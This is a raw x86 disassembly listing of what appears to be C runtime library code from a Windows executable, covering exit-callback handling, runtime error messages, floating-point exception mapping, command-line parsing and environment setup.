  422be0:	pop    esi
  422be1:	ret    
  422be2:	push   ebp
  422be3:	mov    ebp,esp
  422be5:	push   esi
  422be6:	push   edi
  422be7:	push   0x8
  422be9:	call   0x423a1f
  422bee:	xor    esi,esi
  422bf0:	inc    esi
  422bf1:	cmp    DWORD PTR ds:0x45cb04,esi
  422bf7:	pop    ecx
  422bf8:	jne    0x422c0a
  422bfa:	push   DWORD PTR [ebp+0x8]
  422bfd:	call   DWORD PTR ds:0x428030
  422c03:	push   eax
  422c04:	call   DWORD PTR ds:0x42802c
  422c0a:	cmp    DWORD PTR [ebp+0xc],0x0
  422c0e:	mov    al,BYTE PTR [ebp+0x10]
  422c11:	mov    DWORD PTR ds:0x45cb00,esi
  422c17:	mov    ds:0x45cafc,al
  422c1c:	jne    0x422c70
  422c1e:	mov    ecx,DWORD PTR ds:0x45d268
  422c24:	test   ecx,ecx
  422c26:	je     0x422c51
  422c28:	mov    eax,ds:0x45d264
  422c2d:	sub    eax,0x4
  422c30:	cmp    eax,ecx
  422c32:	jmp    0x422c4a
  422c34:	mov    eax,DWORD PTR [eax]
  422c36:	test   eax,eax
  422c38:	je     0x422c3c
  422c3a:	call   eax
  422c3c:	mov    eax,ds:0x45d264
  422c41:	sub    eax,0x4
  422c44:	cmp    eax,DWORD PTR ds:0x45d268
  422c4a:	mov    ds:0x45d264,eax
  422c4f:	jae    0x422c34
  422c51:	mov    eax,0x42a01c
  422c56:	mov    esi,0x42a020
  422c5b:	cmp    eax,esi
  422c5d:	mov    edi,eax
  422c5f:	jae    0x422c70
  422c61:	mov    eax,DWORD PTR [edi]
  422c63:	test   eax,eax
  422c65:	je     0x422c69
  422c67:	call   eax
  422c69:	add    edi,0x4
  422c6c:	cmp    edi,esi
  422c6e:	jb     0x422c61
  422c70:	mov    eax,0x42a024
  422c75:	mov    esi,0x42a028
  422c7a:	cmp    eax,esi
  422c7c:	mov    edi,eax
  422c7e:	jae    0x422c8f
  422c80:	mov    eax,DWORD PTR [edi]
  422c82:	test   eax,eax
  422c84:	je     0x422c88
  422c86:	call   eax
  422c88:	add    edi,0x4
  422c8b:	cmp    edi,esi
  422c8d:	jb     0x422c80
  422c8f:	cmp    DWORD PTR [ebp+0x10],0x0
  422c93:	pop    edi
  422c94:	pop    esi
  422c95:	je     0x422ca0
  422c97:	push   0x8
  422c99:	call   0x42398b
  422c9e:	jmp    0x422cb2
  422ca0:	push   DWORD PTR [ebp+0x8]
  422ca3:	mov    DWORD PTR ds:0x45cb04,0x1
  422cad:	call   0x422b3b
  422cb2:	pop    ecx
  422cb3:	pop    ebp
  422cb4:	ret    
  422cb5:	push   0x0
  422cb7:	push   0x0
  422cb9:	push   DWORD PTR [esp+0xc]
  422cbd:	call   0x422be2
  422cc2:	add    esp,0xc
  422cc5:	ret    
  422cc6:	push   0x0
  422cc8:	push   0x1
  422cca:	push   DWORD PTR [esp+0xc]
  422cce:	call   0x422be2
  422cd3:	add    esp,0xc
  422cd6:	ret    
  422cd7:	push   0x1
  422cd9:	push   0x0
  422cdb:	push   0x0
  422cdd:	call   0x422be2
  422ce2:	add    esp,0xc
  422ce5:	ret    
  422ce6:	push   0x1
  422ce8:	push   0x1
  422cea:	push   0x0
  422cec:	call   0x422be2
  422cf1:	add    esp,0xc
  422cf4:	ret    
  422cf5:	push   ebp
  422cf6:	mov    ebp,esp
  422cf8:	sub    esp,0x10c
  422cfe:	mov    eax,ds:0x45c430
  422d03:	xor    eax,DWORD PTR [ebp+0x4]
  422d06:	mov    ecx,DWORD PTR [ebp+0x8]
  422d09:	push   ebx
  422d0a:	push   esi
  422d0b:	mov    DWORD PTR [ebp-0x4],eax
  422d0e:	xor    edx,edx
  422d10:	push   edi
  422d11:	xor    eax,eax
  422d13:	cmp    ecx,DWORD PTR [eax*8+0x45c1c8]
  422d1a:	je     0x422d22
  422d1c:	inc    eax
  422d1d:	cmp    eax,0x12
  422d20:	jb     0x422d13
  422d22:	mov    esi,eax
  422d24:	shl    esi,0x3
  422d27:	cmp    ecx,DWORD PTR [esi+0x45c1c8]
  422d2d:	jne    0x422e56
  422d33:	mov    eax,ds:0x45cabc
  422d38:	cmp    eax,0x1
  422d3b:	je     0x422e31
  422d41:	cmp    eax,edx
  422d43:	jne    0x422d52
  422d45:	cmp    DWORD PTR ds:0x45c1c4,0x1
  422d4c:	je     0x422e31
  422d52:	cmp    ecx,0xfc
  422d58:	je     0x422e56
  422d5e:	push   0x104
  422d63:	lea    eax,[ebp-0x10c]
  422d69:	push   eax
  422d6a:	push   edx
  422d6b:	mov    BYTE PTR [ebp-0x8],dl
  422d6e:	call   DWORD PTR ds:0x42803c
  422d74:	test   eax,eax
  422d76:	jne    0x422d8b
  422d78:	lea    eax,[ebp-0x10c]
  422d7e:	push   0x428484
  422d83:	push   eax
  422d84:	call   0x423c40
  422d89:	pop    ecx
  422d8a:	pop    ecx
  422d8b:	lea    eax,[ebp-0x10c]
  422d91:	push   eax
  422d92:	lea    edi,[ebp-0x10c]
  422d98:	call   0x423e70
  422d9d:	inc    eax
  422d9e:	cmp    eax,0x3c
  422da1:	pop    ecx
  422da2:	jbe    0x422dcd
  422da4:	lea    eax,[ebp-0x10c]
  422daa:	push   eax
  422dab:	call   0x423e70
  422db0:	mov    edi,eax
  422db2:	lea    eax,[ebp-0x10c]
  422db8:	sub    eax,0x3b
  422dbb:	push   0x3
  422dbd:	add    edi,eax
  422dbf:	push   0x428480
  422dc4:	push   edi
  422dc5:	call   0x423d40
  422dca:	add    esp,0x10
  422dcd:	push   edi
  422dce:	call   0x423e70
  422dd3:	push   DWORD PTR [esi+0x45c1cc]
  422dd9:	mov    ebx,eax
  422ddb:	call   0x423e70
  422de0:	lea    eax,[ebx+eax*1+0x1c]
  422de4:	pop    ecx
  422de5:	add    eax,0x3
  422de8:	pop    ecx
  422de9:	and    eax,0xfffffffc
  422dec:	call   0x4238b0
  422df1:	mov    ebx,esp
  422df3:	push   0x428464
  422df8:	push   ebx
  422df9:	call   0x423c40
  422dfe:	push   edi
  422dff:	push   ebx
  422e00:	call   0x423c50
  422e05:	push   0x428460
  422e0a:	push   ebx
  422e0b:	call   0x423c50
  422e10:	push   DWORD PTR [esi+0x45c1cc]
  422e16:	push   ebx
  422e17:	call   0x423c50
  422e1c:	push   0x12010
  422e21:	push   0x428438
  422e26:	push   ebx
  422e27:	call   0x423b42
  422e2c:	add    esp,0x2c
  422e2f:	jmp    0x422e56
  422e31:	push   edx
  422e32:	lea    eax,[ebp+0x8]
  422e35:	push   eax
  422e36:	lea    esi,[esi+0x45c1cc]
  422e3c:	push   DWORD PTR [esi]
  422e3e:	call   0x423e70
  422e43:	pop    ecx
  422e44:	push   eax
  422e45:	push   DWORD PTR [esi]
  422e47:	push   0xfffffff4
  422e49:	call   DWORD PTR ds:0x428038
  422e4f:	push   eax
  422e50:	call   DWORD PTR ds:0x428034
  422e56:	lea    esp,[ebp-0x118]
  422e5c:	mov    ecx,DWORD PTR [ebp-0x4]
  422e5f:	xor    ecx,DWORD PTR [ebp+0x4]
  422e62:	call   0x423f2c
  422e67:	pop    edi
  422e68:	pop    esi
  422e69:	pop    ebx
  422e6a:	leave  
  422e6b:	ret    
  422e6c:	mov    eax,ds:0x45cabc
  422e71:	cmp    eax,0x1
  422e74:	je     0x422e83
  422e76:	test   eax,eax
  422e78:	jne    0x422ea4
  422e7a:	cmp    DWORD PTR ds:0x45c1c4,0x1
  422e81:	jne    0x422ea4
  422e83:	push   0xfc
  422e88:	call   0x422cf5
  422e8d:	mov    eax,ds:0x45cb08
  422e92:	test   eax,eax
  422e94:	pop    ecx
  422e95:	je     0x422e99
  422e97:	call   eax
  422e99:	push   0xff
  422e9e:	call   0x422cf5
  422ea3:	pop    ecx
  422ea4:	ret    
  422ea5:	push   ebp
  422ea6:	mov    ebp,esp
  422ea8:	push   ecx
  422ea9:	push   ebx
  422eaa:	push   esi
  422eab:	push   edi
  422eac:	call   0x42370d
  422eb1:	mov    edi,DWORD PTR [ebp+0x8]
  422eb4:	mov    esi,eax
  422eb6:	mov    edx,DWORD PTR [esi+0x54]
  422eb9:	mov    eax,ds:0x45c2dc
  422ebe:	mov    ecx,edx
  422ec0:	cmp    DWORD PTR [ecx],edi
  422ec2:	je     0x422ed1
  422ec4:	lea    ebx,[eax+eax*2]
  422ec7:	add    ecx,0xc
  422eca:	lea    ebx,[edx+ebx*4]
  422ecd:	cmp    ecx,ebx
  422ecf:	jb     0x422ec0
  422ed1:	lea    eax,[eax+eax*2]
  422ed4:	lea    eax,[edx+eax*4]
  422ed7:	cmp    ecx,eax
  422ed9:	jae    0x422edf
  422edb:	cmp    DWORD PTR [ecx],edi
  422edd:	je     0x422ee1
  422edf:	xor    ecx,ecx
  422ee1:	test   ecx,ecx
  422ee3:	je     0x422ffb
  422ee9:	mov    ebx,DWORD PTR [ecx+0x8]
  422eec:	test   ebx,ebx
  422eee:	mov    DWORD PTR [ebp+0x8],ebx
  422ef1:	je     0x422ffb
  422ef7:	cmp    ebx,0x5
  422efa:	jne    0x422f08
  422efc:	and    DWORD PTR [ecx+0x8],0x0
  422f00:	xor    eax,eax
  422f02:	inc    eax
  422f03:	jmp    0x423004
  422f08:	cmp    ebx,0x1
  422f0b:	je     0x422ff6
  422f11:	mov    eax,DWORD PTR [esi+0x58]
  422f14:	mov    DWORD PTR [ebp-0x4],eax
  422f17:	mov    eax,DWORD PTR [ebp+0xc]
  422f1a:	mov    DWORD PTR [esi+0x58],eax
  422f1d:	mov    eax,DWORD PTR [ecx+0x4]
  422f20:	cmp    eax,0x8
  422f23:	jne    0x422fe8
  422f29:	mov    edx,DWORD PTR ds:0x45c2d0
  422f2f:	mov    eax,ds:0x45c2d4
  422f34:	add    eax,edx
  422f36:	cmp    edx,eax
  422f38:	jge    0x422f61
  422f3a:	lea    eax,[edx+edx*2]
  422f3d:	shl    eax,0x2
  422f40:	mov    edi,DWORD PTR [esi+0x54]
  422f43:	and    DWORD PTR [eax+edi*1+0x8],0x0
  422f48:	mov    edi,DWORD PTR ds:0x45c2d0
  422f4e:	mov    ebx,DWORD PTR ds:0x45c2d4
  422f54:	inc    edx
  422f55:	add    ebx,edi
  422f57:	add    eax,0xc
  422f5a:	cmp    edx,ebx
  422f5c:	jl     0x422f40
  422f5e:	mov    ebx,DWORD PTR [ebp+0x8]
  422f61:	mov    ecx,DWORD PTR [ecx]
  422f63:	cmp    ecx,0xc000008e
  422f69:	mov    edi,DWORD PTR [esi+0x5c]
  422f6c:	jne    0x422f77
  422f6e:	mov    DWORD PTR [esi+0x5c],0x83
  422f75:	jmp    0x422fdb
  422f77:	cmp    ecx,0xc0000090
  422f7d:	jne    0x422f88
  422f7f:	mov    DWORD PTR [esi+0x5c],0x81
  422f86:	jmp    0x422fdb
  422f88:	cmp    ecx,0xc0000091
  422f8e:	jne    0x422f99
  422f90:	mov    DWORD PTR [esi+0x5c],0x84
  422f97:	jmp    0x422fdb
  422f99:	cmp    ecx,0xc0000093
  422f9f:	jne    0x422faa
  422fa1:	mov    DWORD PTR [esi+0x5c],0x85
  422fa8:	jmp    0x422fdb
  422faa:	cmp    ecx,0xc000008d
  422fb0:	jne    0x422fbb
  422fb2:	mov    DWORD PTR [esi+0x5c],0x82
  422fb9:	jmp    0x422fdb
  422fbb:	cmp    ecx,0xc000008f
  422fc1:	jne    0x422fcc
  422fc3:	mov    DWORD PTR [esi+0x5c],0x86
  422fca:	jmp    0x422fdb
  422fcc:	cmp    ecx,0xc0000092
  422fd2:	jne    0x422fdb
  422fd4:	mov    DWORD PTR [esi+0x5c],0x8a
  422fdb:	push   DWORD PTR [esi+0x5c]
  422fde:	push   0x8
  422fe0:	call   ebx
  422fe2:	pop    ecx
  422fe3:	mov    DWORD PTR [esi+0x5c],edi
  422fe6:	jmp    0x422fef
  422fe8:	and    DWORD PTR [ecx+0x8],0x0
  422fec:	push   eax
  422fed:	call   ebx
  422fef:	mov    eax,DWORD PTR [ebp-0x4]
  422ff2:	pop    ecx
  422ff3:	mov    DWORD PTR [esi+0x58],eax
  422ff6:	or     eax,0xffffffff
  422ff9:	jmp    0x423004
  422ffb:	push   DWORD PTR [ebp+0xc]
  422ffe:	call   DWORD PTR ds:0x428040
  423004:	pop    edi
  423005:	pop    esi
  423006:	pop    ebx
  423007:	leave  
  423008:	ret    
  423009:	cmp    DWORD PTR ds:0x45d26c,0x0
  423010:	jne    0x423017
  423012:	call   0x42444c
  423017:	push   esi
  423018:	mov    esi,DWORD PTR ds:0x45d274
  42301e:	test   esi,esi
  423020:	jne    0x423029
  423022:	mov    esi,0x42849b
  423027:	jmp    0x42306e
  423029:	mov    al,BYTE PTR [esi]
  42302b:	cmp    al,0x22
  42302d:	jne    0x423057
  42302f:	inc    esi
  423030:	mov    al,BYTE PTR [esi]
  423032:	cmp    al,0x22
  423034:	je     0x423067
  423036:	test   al,al
  423038:	je     0x423050
  42303a:	movzx  eax,al
  42303d:	push   eax
  42303e:	call   0x423f6b
  423043:	test   eax,eax
  423045:	pop    ecx
  423046:	je     0x423049
  423048:	inc    esi
  423049:	inc    esi
  42304a:	mov    al,BYTE PTR [esi]
  42304c:	cmp    al,0x22
  42304e:	jne    0x423036
  423050:	cmp    BYTE PTR [esi],0x22
  423053:	jne    0x423068
  423055:	jmp    0x423067
  423057:	cmp    al,0x20
  423059:	jbe    0x423068
  42305b:	inc    esi
  42305c:	cmp    BYTE PTR [esi],0x20
  42305f:	ja     0x42305b
  423061:	jmp    0x423068
  423063:	cmp    al,0x20
  423065:	ja     0x42306e
  423067:	inc    esi
  423068:	mov    al,BYTE PTR [esi]
  42306a:	test   al,al
  42306c:	jne    0x423063
  42306e:	mov    eax,esi
  423070:	pop    esi
  423071:	ret    
  423072:	push   ebx
  423073:	xor    ebx,ebx
  423075:	cmp    DWORD PTR ds:0x45d26c,ebx
  42307b:	push   esi
  42307c:	push   edi
  42307d:	jne    0x423084
  42307f:	call   0x42444c
  423084:	mov    esi,DWORD PTR ds:0x45cab4
  42308a:	xor    edi,edi
  42308c:	cmp    esi,ebx
  42308e:	jne    0x4230a2
  423090:	jmp    0x4230c2
  423092:	cmp    al,0x3d
  423094:	je     0x423097
  423096:	inc    edi
  423097:	push   esi
  423098:	call   0x423e70
  42309d:	pop    ecx
  42309e:	lea    esi,[esi+eax*1+0x1]
  4230a2:	mov    al,BYTE PTR [esi]
  4230a4:	cmp    al,bl
  4230a6:	jne    0x423092
  4230a8:	lea    eax,[edi*4+0x4]
  4230af:	push   eax
  4230b0:	call   0x424582
  4230b5:	mov    edi,eax
  4230b7:	cmp    edi,ebx
  4230b9:	pop    ecx
  4230ba:	mov    DWORD PTR ds:0x45cae4,edi
  4230c0:	jne    0x4230c7
  4230c2:	or     eax,0xffffffff
  4230c5:	jmp    0x42311f
  4230c7:	mov    esi,DWORD PTR ds:0x45cab4
  4230cd:	push   ebp
  4230ce:	jmp    0x4230fa
  4230d0:	push   esi
  4230d1:	call   0x423e70
  4230d6:	mov    ebp,eax
  4230d8:	inc    ebp
  4230d9:	cmp    BYTE PTR [esi],0x3d
  4230dc:	pop    ecx
  4230dd:	je     0x4230f8
  4230df:	push   ebp
  4230e0:	call   0x424582
  4230e5:	cmp    eax,ebx
  4230e7:	pop    ecx
  4230e8:	mov    DWORD PTR [edi],eax
  4230ea:	je     0x423123
  4230ec:	push   esi
  4230ed:	push   eax
  4230ee:	call   0x423c40
  4230f3:	pop    ecx
  4230f4:	pop    ecx
  4230f5:	add    edi,0x4
  4230f8:	add    esi,ebp
  4230fa:	cmp    BYTE PTR [esi],bl
  4230fc:	jne    0x4230d0
  4230fe:	push   DWORD PTR ds:0x45cab4
  423104:	call   0x42446a
  423109:	mov    DWORD PTR ds:0x45cab4,ebx
  42310f:	mov    DWORD PTR [edi],ebx
  423111:	mov    DWORD PTR ds:0x45d260,0x1
  42311b:	xor    eax,eax
  42311d:	pop    ecx
  42311e:	pop    ebp
  42311f:	pop    edi
  423120:	pop    esi
  423121:	pop    ebx
  423122:	ret    
  423123:	push   DWORD PTR ds:0x45cae4
  423129:	call   0x42446a
  42312e:	mov    DWORD PTR ds:0x45cae4,ebx
  423134:	or     eax,0xffffffff
  423137:	jmp    0x42311d
  423139:	push   ebp
  42313a:	mov    ebp,esp
  42313c:	push   ecx
  42313d:	push   ebx
  42313e:	mov    ebx,DWORD PTR [ebp+0xc]
  423141:	xor    edx,edx
  423143:	cmp    DWORD PTR [ebp+0x8],edx
  423146:	push   edi
  423147:	mov    DWORD PTR [esi],edx
  423149:	mov    edi,ecx
  42314b:	mov    DWORD PTR [ebx],0x1
  423151:	je     0x42315c
  423153:	mov    ecx,DWORD PTR [ebp+0x8]
  423156:	add    DWORD PTR [ebp+0x8],0x4
  42315a:	mov    DWORD PTR [ecx],edi
  42315c:	cmp    BYTE PTR [eax],0x22
  42315f:	jne    0x42316f
  423161:	xor    ecx,ecx
  423163:	test   edx,edx
  423165:	sete   cl
  423168:	inc    eax
  423169:	mov    edx,ecx
  42316b:	mov    cl,0x22
  42316d:	jmp    0x42319c
  42316f:	inc    DWORD PTR [esi]
  423171:	test   edi,edi
  423173:	je     0x42317a
  423175:	mov    cl,BYTE PTR [eax]
  423177:	mov    BYTE PTR [edi],cl
  423179:	inc    edi
  42317a:	mov    cl,BYTE PTR [eax]
  42317c:	movzx  ebx,cl
  42317f:	inc    eax
  423180:	test   BYTE PTR [ebx+0x45cf21],0x4
  423187:	je     0x423195
  423189:	inc    DWORD PTR [esi]
  42318b:	test   edi,edi
  42318d:	je     0x423194
  42318f:	mov    bl,BYTE PTR [eax]
  423191:	mov    BYTE PTR [edi],bl
  423193:	inc    edi
  423194:	inc    eax
  423195:	test   cl,cl
  423197:	mov    ebx,DWORD PTR [ebp+0xc]
  42319a:	je     0x4231ce
  42319c:	test   edx,edx
  42319e:	jne    0x42315c
  4231a0:	cmp    cl,0x20
  4231a3:	je     0x4231aa
  4231a5:	cmp    cl,0x9
  4231a8:	jne    0x42315c
  4231aa:	test   edi,edi
  4231ac:	je     0x4231b2
  4231ae:	and    BYTE PTR [edi-0x1],0x0
  4231b2:	and    DWORD PTR [ebp-0x4],0x0
  4231b6:	cmp    BYTE PTR [eax],0x0
  4231b9:	je     0x423295
  4231bf:	mov    cl,BYTE PTR [eax]
  4231c1:	cmp    cl,0x20
  4231c4:	je     0x4231cb
  4231c6:	cmp    cl,0x9
  4231c9:	jne    0x4231d1
  4231cb:	inc    eax
  4231cc:	jmp    0x4231bf
  4231ce:	dec    eax
  4231cf:	jmp    0x4231b2
  4231d1:	cmp    BYTE PTR [eax],0x0
  4231d4:	je     0x423295
  4231da:	cmp    DWORD PTR [ebp+0x8],0x0
  4231de:	je     0x4231e9
  4231e0:	mov    ecx,DWORD PTR [ebp+0x8]
  4231e3:	add    DWORD PTR [ebp+0x8],0x4
  4231e7:	mov    DWORD PTR [ecx],edi
  4231e9:	inc    DWORD PTR [ebx]
  4231eb:	xor    ebx,ebx
  4231ed:	inc    ebx
  4231ee:	xor    edx,edx
  4231f0:	jmp    0x4231f4
  4231f2:	inc    eax
  4231f3:	inc    edx
  4231f4:	cmp    BYTE PTR [eax],0x5c
  4231f7:	je     0x4231f2
  4231f9:	cmp    BYTE PTR [eax],0x22
  4231fc:	jne    0x423224
  4231fe:	test   dl,0x1
  423201:	jne    0x423222
  423203:	cmp    DWORD PTR [ebp-0x4],0x0
  423207:	je     0x423215
  423209:	lea    ecx,[eax+0x1]
  42320c:	cmp    BYTE PTR [ecx],0x22
  42320f:	jne    0x423215
  423211:	mov    eax,ecx
  423213:	jmp    0x423217
  423215:	xor    ebx,ebx
  423217:	xor    ecx,ecx
  423219:	cmp    DWORD PTR [ebp-0x4],ecx
  42321c:	sete   cl
  42321f:	mov    DWORD PTR [ebp-0x4],ecx
  423222:	shr    edx,1
  423224:	test   edx,edx
  423226:	je     0x423235
  423228:	test   edi,edi
  42322a:	je     0x423230
  42322c:	mov    BYTE PTR [edi],0x5c
  42322f:	inc    edi
  423230:	inc    DWORD PTR [esi]
  423232:	dec    edx
  423233:	jne    0x423228
  423235:	mov    cl,BYTE PTR [eax]
  423237:	test   cl,cl
  423239:	je     0x423283
  42323b:	cmp    DWORD PTR [ebp-0x4],0x0
  42323f:	jne    0x42324b
  423241:	cmp    cl,0x20
  423244:	je     0x423283
  423246:	cmp    cl,0x9
  423249:	je     0x423283
  42324b:	test   ebx,ebx
  42324d:	je     0x42327d
  42324f:	test   edi,edi
  423251:	je     0x42326c
  423253:	movzx  edx,cl
  423256:	test   BYTE PTR [edx+0x45cf21],0x4
  42325d:	je     0x423265
  42325f:	mov    BYTE PTR [edi],cl
  423261:	inc    edi
  423262:	inc    eax
  423263:	inc    DWORD PTR [esi]
  423265:	mov    cl,BYTE PTR [eax]
  423267:	mov    BYTE PTR [edi],cl
  423269:	inc    edi
  42326a:	jmp    0x42327b
  42326c:	movzx  ecx,cl
  42326f:	test   BYTE PTR [ecx+0x45cf21],0x4
  423276:	je     0x42327b
  423278:	inc    eax
  423279:	inc    DWORD PTR [esi]
  42327b:	inc    DWORD PTR [esi]
  42327d:	inc    eax
  42327e:	jmp    0x4231eb
  423283:	test   edi,edi
  423285:	je     0x42328b
  423287:	and    BYTE PTR [edi],0x0
  42328a:	inc    edi
  42328b:	inc    DWORD PTR [esi]
  42328d:	mov    ebx,DWORD PTR [ebp+0xc]
  423290:	jmp    0x4231b6
  423295:	mov    eax,DWORD PTR [ebp+0x8]
  423298:	test   eax,eax
  42329a:	je     0x42329f
  42329c:	and    DWORD PTR [eax],0x0
  42329f:	inc    DWORD PTR [ebx]
  4232a1:	pop    edi
  4232a2:	pop    ebx
  4232a3:	leave  
  4232a4:	ret    
  4232a5:	push   ebp
  4232a6:	mov    ebp,esp
  4232a8:	push   ecx
  4232a9:	push   ecx
  4232aa:	push   ebx
  4232ab:	push   esi
  4232ac:	push   edi
  4232ad:	xor    edi,edi
  4232af:	cmp    DWORD PTR ds:0x45d26c,edi
  4232b5:	jne    0x4232bc
  4232b7:	call   0x42444c
  4232bc:	and    BYTE PTR ds:0x45cc14,0x0
  4232c3:	push   0x104
  4232c8:	mov    esi,0x45cb10
  4232cd:	push   esi
  4232ce:	push   edi
  4232cf:	call   DWORD PTR ds:0x42803c
  4232d5:	mov    eax,ds:0x45d274
  4232da:	cmp    eax,edi
  4232dc:	mov    DWORD PTR ds:0x45caf4,esi
  4232e2:	je     0x4232eb
  4232e4:	cmp    BYTE PTR [eax],0x0
  4232e7:	mov    ebx,eax
  4232e9:	jne    0x4232ed
  4232eb:	mov    ebx,esi
  4232ed:	lea    eax,[ebp-0x4]
  4232f0:	push   eax
  4232f1:	push   edi
  4232f2:	lea    esi,[ebp-0x8]
  4232f5:	xor    ecx,ecx
  4232f7:	mov    eax,ebx
  4232f9:	call   0x423139
  4232fe:	mov    esi,DWORD PTR [ebp-0x4]
  423301:	mov    eax,DWORD PTR [ebp-0x8]
  423304:	shl    esi,0x2
  423307:	add    eax,esi
  423309:	push   eax
  42330a:	call   0x424582
  42330f:	mov    edi,eax
  423311:	add    esp,0xc
  423314:	test   edi,edi
  423316:	jne    0x42331d
  423318:	or     eax,0xffffffff
  42331b:	jmp    0x423342
  42331d:	lea    eax,[ebp-0x4]
  423320:	push   eax
  423321:	lea    ecx,[esi+edi*1]
  423324:	push   edi
  423325:	lea    esi,[ebp-0x8]
  423328:	mov    eax,ebx
  42332a:	call   0x423139
  42332f:	mov    eax,DWORD PTR [ebp-0x4]
  423332:	dec    eax
  423333:	pop    ecx
  423334:	mov    ds:0x45cad8,eax
  423339:	pop    ecx
  42333a:	mov    DWORD PTR ds:0x45cadc,edi
  423340:	xor    eax,eax
  423342:	pop    edi
  423343:	pop    esi
  423344:	pop    ebx
  423345:	leave  
  423346:	ret    
  423347:	push   ecx
  423348:	push   ecx
  423349:	mov    eax,ds:0x45cc18
  42334e:	push   ebx
  42334f:	push   ebp
  423350:	push   esi
  423351:	push   edi
  423352:	mov    edi,DWORD PTR ds:0x428054
  423358:	xor    ebx,ebx
  42335a:	xor    esi,esi
  42335c:	cmp    eax,ebx
  42335e:	push   0x2
  423360:	pop    ebp
  423361:	jne    0x423390
  423363:	call   edi
  423365:	mov    esi,eax
  423367:	cmp    esi,ebx
  423369:	je     0x423377
  42336b:	mov    DWORD PTR ds:0x45cc18,0x1
  423375:	jmp    0x423395
  423377:	call   DWORD PTR ds:0x428010
  42337d:	cmp    eax,0x78
  423380:	jne    0x42338b
  423382:	mov    eax,ebp
  423384:	mov    ds:0x45cc18,eax
  423389:	jmp    0x423390
  42338b:	mov    eax,ds:0x45cc18
  423390:	cmp    eax,0x1
  423393:	jne    0x423412
  423395:	cmp    esi,ebx
  423397:	jne    0x4233a1
  423399:	call   edi
  42339b:	mov    esi,eax
  42339d:	cmp    esi,ebx
  42339f:	je     0x42341a
  4233a1:	cmp    WORD PTR [esi],bx
  4233a4:	mov    eax,esi
  4233a6:	je     0x4233b6
  4233a8:	add    eax,ebp
  4233aa:	cmp    WORD PTR [eax],bx
  4233ad:	jne    0x4233a8
  4233af:	add    eax,ebp
  4233b1:	cmp    WORD PTR [eax],bx
  4233b4:	jne    0x4233a8
  4233b6:	mov    edi,DWORD PTR ds:0x428050
  4233bc:	push   ebx
  4233bd:	push   ebx
  4233be:	push   ebx
  4233bf:	sub    eax,esi
  4233c1:	push   ebx
  4233c2:	sar    eax,1
  4233c4:	inc    eax
  4233c5:	push   eax
  4233c6:	push   esi
  4233c7:	push   ebx
  4233c8:	push   ebx
  4233c9:	mov    DWORD PTR [esp+0x34],eax
  4233cd:	call   edi
  4233cf:	mov    ebp,eax
  4233d1:	cmp    ebp,ebx
  4233d3:	je     0x423407
  4233d5:	push   ebp
  4233d6:	call   0x424582
  4233db:	cmp    eax,ebx
  4233dd:	pop    ecx
  4233de:	mov    DWORD PTR [esp+0x10],eax
  4233e2:	je     0x423407
  4233e4:	push   ebx
  4233e5:	push   ebx
  4233e6:	push   ebp
  4233e7:	push   eax
  4233e8:	push   DWORD PTR [esp+0x24]
  4233ec:	push   esi
  4233ed:	push   ebx
  4233ee:	push   ebx
  4233ef:	call   edi
  4233f1:	test   eax,eax
  4233f3:	jne    0x423403
  4233f5:	push   DWORD PTR [esp+0x10]
  4233f9:	call   0x42446a
  4233fe:	pop    ecx
  4233ff:	mov    DWORD PTR [esp+0x10],ebx
  423403:	mov    ebx,DWORD PTR [esp+0x10]
  423407:	push   esi
  423408:	call   DWORD PTR ds:0x42804c
  42340e:	mov    eax,ebx
  423410:	jmp    0x423462
  423412:	cmp    eax,ebp
  423414:	je     0x42341e
  423416:	cmp    eax,ebx
  423418:	je     0x42341e
  42341a:	xor    eax,eax
  42341c:	jmp    0x423462
  42341e:	call   DWORD PTR ds:0x428048
  423424:	mov    esi,eax
  423426:	cmp    esi,ebx
  423428:	je     0x42341a
  42342a:	cmp    BYTE PTR [esi],bl
  42342c:	je     0x423438
  42342e:	inc    eax
  42342f:	cmp    BYTE PTR [eax],bl
  423431:	jne    0x42342e
  423433:	inc    eax
  423434:	cmp    BYTE PTR [eax],bl
  423436:	jne    0x42342e
  423438:	sub    eax,esi
  42343a:	inc    eax
  42343b:	mov    ebp,eax
  42343d:	push   ebp
  42343e:	call   0x424582
  423443:	mov    edi,eax
  423445:	cmp    edi,ebx
  423447:	pop    ecx
  423448:	jne    0x42344e
  42344a:	xor    edi,edi
  42344c:	jmp    0x423459
  42344e:	push   ebp
  42344f:	push   esi
  423450:	push   edi
  423451:	call   0x4245a0
  423456:	add    esp,0xc
  423459:	push   esi
  42345a:	call   DWORD PTR ds:0x428044
  423460:	mov    eax,edi
  423462:	pop    edi
  423463:	pop    esi
  423464:	pop    ebp
  423465:	pop    ebx
  423466:	pop    ecx
  423467:	pop    ecx
  423468:	ret    
  423469:	sub    esp,0x48
  42346c:	push   ebx
  42346d:	mov    ebx,0x480
  423472:	push   ebx
  423473:	call   0x424582
  423478:	test   eax,eax
  42347a:	pop    ecx
  42347b:	jne    0x423485
  42347d:	or     eax,0xffffffff
  423480:	jmp    0x423662
  423485:	mov    ds:0x45d160,eax
  42348a:	mov    DWORD PTR ds:0x45d148,0x20
  423494:	lea    ecx,[eax+0x480]
  42349a:	jmp    0x4234ba
  42349c:	and    BYTE PTR [eax+0x4],0x0
  4234a0:	or     DWORD PTR [eax],0xffffffff
  4234a3:	and    DWORD PTR [eax+0x8],0x0
  4234a7:	mov    BYTE PTR [eax+0x5],0xa
  4234ab:	mov    ecx,DWORD PTR ds:0x45d160
  4234b1:	add    eax,0x24
  4234b4:	add    ecx,0x480
  4234ba:	cmp    eax,ecx
  4234bc:	jb     0x42349c
  4234be:	push   ebp
  4234bf:	push   esi
  4234c0:	push   edi
  4234c1:	lea    eax,[esp+0x14]
  4234c5:	push   eax
  4234c6:	call   DWORD PTR ds:0x42801c
  4234cc:	cmp    WORD PTR [esp+0x46],0x0
  4234d2:	je     0x4235c1
  4234d8:	mov    eax,DWORD PTR [esp+0x48]
  4234dc:	test   eax,eax
  4234de:	je     0x4235c1
  4234e4:	mov    edi,DWORD PTR [eax]
  4234e6:	lea    ebp,[eax+0x4]
  4234e9:	lea    eax,[edi+ebp*1]
  4234ec:	mov    DWORD PTR [esp+0x10],eax
  4234f0:	mov    eax,0x800
  4234f5:	cmp    edi,eax
  4234f7:	jl     0x4234fb
  4234f9:	mov    edi,eax
  4234fb:	cmp    DWORD PTR ds:0x45d148,edi
  423501:	jge    0x423551
  423503:	mov    esi,0x45d164
  423508:	push   ebx
  423509:	call   0x424582
  42350e:	test   eax,eax
  423510:	pop    ecx
  423511:	je     0x42354b
  423513:	add    DWORD PTR ds:0x45d148,0x20
